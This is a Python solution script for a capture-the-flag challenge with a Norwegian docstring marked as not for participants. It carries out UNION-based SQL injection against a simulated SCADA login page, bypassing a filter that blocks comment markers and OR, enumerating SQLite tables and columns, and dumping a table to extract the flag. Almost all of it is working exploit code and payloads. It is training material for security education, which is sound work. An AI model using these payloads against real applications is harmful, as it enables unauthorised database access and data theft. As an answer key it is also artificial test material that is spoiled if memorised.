"""
LØSNING — SCADA SQLi (ikke gi til deltakerne!)

Filteret blokkerer: --, #, /*, OR (ordgrense)
Filteret TILLATER: UNION, SELECT, enkeltfnutter, WHERE, AND

Teknikk: UNION-basert injection uten trailing comment.
Queryen balanseres med WHERE '1'='1 i stedet for --.

Full SQL som kjøres:
  SELECT id, username, role FROM users WHERE username=? AND password='<payload>'

Etter injection (eksempel):
  ...password='' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table' AND '1'='1'

username-kolonne (indeks 1) vises på dashboardet.
"""

import sys

import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"

def inject(payload):
    r = requests.post(BASE + "/", data={"username": "x", "password": payload}, allow_redirects=True)
    # Dashboardet viser: Velkommen, <username>
    if "Velkommen" in r.text:
        start = r.text.find("Velkommen, ") + len("Velkommen, ")
        end   = r.text.find("<", start)
        return r.text[start:end].strip()
    return None


def step1_kolonnekontroll():
    print("=== Steg 1: Finn antall kolonner ===")
    for n in range(1, 6):
        nums = ",".join(str(i) for i in range(1, n + 1))
        payload = f"' UNION SELECT {nums} WHERE '1'='1"
        result = inject(payload)
        if result:
            print(f"  {n} kolonner bekreftet. Kolonne 2 viser: {result}")
            return n
        print(f"  {n} kolonner: ingen treff")
    return None


def step2_finn_tabeller():
    print("\n=== Steg 2: Finn tabeller via sqlite_master ===")
    payload = "' UNION SELECT 1,group_concat(name),3 FROM sqlite_master WHERE type='table' AND '1'='1"
    result = inject(payload)
    print(f"  Tabeller: {result}")
    return result


def step3_finn_kolonner(tabell):
    print(f"\n=== Steg 3: Finn kolonner i '{tabell}' ===")
    payload = f"' UNION SELECT 1,group_concat(name),3 FROM pragma_table_info('{tabell}') WHERE '1'='1"
    result = inject(payload)
    print(f"  Kolonner i {tabell}: {result}")
    return result


def step4_hent_flagg():
    print("\n=== Steg 4: Hent alle verdier fra historian_archive ===")
    payload = "' UNION SELECT 1,group_concat(event),3 FROM historian_archive WHERE '1'='1"
    result = inject(payload)
    print(f"  Alle events: {result}")
    flag = [e for e in result.split(",") if e.startswith("CTF{")]
    if flag:
        print(f"\n  *** FLAGG: {flag[0]} ***")


if __name__ == "__main__":
    step1_kolonnekontroll()
    step2_finn_tabeller()
    step3_finn_kolonner("historian_archive")
    step4_hent_flagg()
